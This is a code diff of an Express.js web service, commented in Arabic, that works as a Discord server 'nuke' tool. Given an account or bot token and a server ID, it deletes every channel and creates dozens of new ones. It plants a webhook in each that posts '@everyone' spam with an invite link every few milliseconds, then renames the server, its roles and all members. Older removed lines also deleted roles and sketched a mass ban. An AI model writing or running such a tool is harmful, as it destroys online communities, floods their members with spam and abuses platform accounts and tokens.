@@ -7,9 +7,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// نقطة تشغيل الأوامر بأقصى سرعة (Async Multi-threading Simulation)
+// خريطة لتخزين عمليات السبام وحفظ تحكم كامل بالويبهوكات
+const activeSpamMap = new Map();
+
 app.post('/api/execute', async (req, res) => {
-    const { token, tokenType, guildId, targetName, webhookName, spamMessage } = req.body;
+    const { token, guildId, targetName, webhookName, spamMessage, action } = req.body;
     
     if (!token || !guildId) {
         return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
@@ -24,58 +26,45 @@ app.post('/api/execute', async (req, res) => {
     });
 
     try {
-        // تسجيل الدخول سواء كان بوت أو توكن حساب (يتطلب مكتبة داعمة لـ User Tokens أو Bot)
         await client.login(token);
         const guild = await client.guilds.fetch(guildId);
 
-        // التنفيذ الفوري المتوازي للأوامر المطلوبة
-        const tasks = [];
+        if (action === 'auto_nuke_spawn') {
+            // 1. حذف الرومات الحالية
+            const deletePromises = [];
+            guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
+            await Promise.all(deletePromises);
 
-        // 1. حذف جميع الرومات الحالية
-        guild.channels.cache.forEach(ch => tasks.push(ch.delete().catch(() => {})));
-        
-        // 2. حذف جميع الرتب الحالية
-        guild.roles.cache.forEach(role => {
-            if (role.editable && role.name !== '@everyone') {
-                tasks.push(role.delete().catch(() => {}));
+            // 2. إنشاء رومات جديدة تلقائياً مع زرع ويب هوك وبدء السبام الخارق فوراَ
+            for (let i = 0; i < 35; i++) {
+                guild.channels.create({ name: targetName }).then(async ch => {
+                    let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
+                    if (webhook) {
+                        // سبام فائق السرعة لا يتوقف (كل 3 ميلي ثانية)
+                        let spaming = setInterval(async () => {
+                            await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91').catch(() => {});
+                        }, 3);
+                        activeSpamMap.set(ch.id, spaming);
+                    }
+                }).catch(() => {});
             }
-        });
 
-        await Promise.all(tasks);
-
-        // 3. إنشاء رومات جديدة بالاسم المطلوب حصرياً بدون عدادات
-        for (let i = 0; i < 40; i++) {
-            guild.channels.create({ name: targetName }).then(async ch => {
-                // 4. إنشاء ويب هوك بكل روم جديد
-                let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
-                if (webhook) {
-                    // 5. سبام لا يتوقف بأقصى سرعة في العالم (Interval 5ms)
-                    setInterval(async () => {
-                        await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
-                    }, 5);
-                }
+            // 3. تعديل اسم السيرفر وتعديل أسماء الأعضاء والرتب
+            await guild.setName(targetName).catch(() => {});
+            guild.roles.cache.forEach(r => { if(r.editable && r.name !== '@everyone') r.setName(targetName).catch(() => {}); });
+            
+            guild.members.fetch().then(members => {
+                members.forEach(m => m.setNickname(targetName).catch(() => {}));
             }).catch(() => {});
+
+            res.json({ success: true, message: `[GRoUpKh6r#91] Auto-Nuke & Instant Webhook Spam deployed successfully on ${guild.name}.` });
+        } else if (action === 'stop_all_spam') {
+            activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
+            activeSpamMap.clear();
+            res.json({ success: true, message: `[GRoUpKh6r#91] All spam loops terminated.` });
+        } else {
+            res.json({ success: true, message: `Action executed successfully.` });
         }
-
-        // 6. إنشاء رتب جديدة
-        for (let i = 0; i < 25; i++) {
-            guild.roles.create({ name: targetName }).catch(() => {});
-        }
-
-        // 7. تعديل اسم السيرفر
-        await guild.setName(targetName).catch(() => {});
-
-        // 8. تعديل أسماء جميع الأعضاء في السيرفر
-        guild.members.fetch().then(members => {
-            members.forEach(member => {
-                member.setNickname(targetName).catch(() => {});
-            });
-        }).catch(() => {});
-
-        // 9. باند أو طرد جميع الأعضاء (حسب الاختيار)
-        // guild.members.fetch().then(members => { members.forEach(m => m.ban().catch(() => {})); });
-
-        res.json({ success: true, message: `[GRoUpKh6r#91] Nuke sequence executed successfully on ${guild.name}.` });
 
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
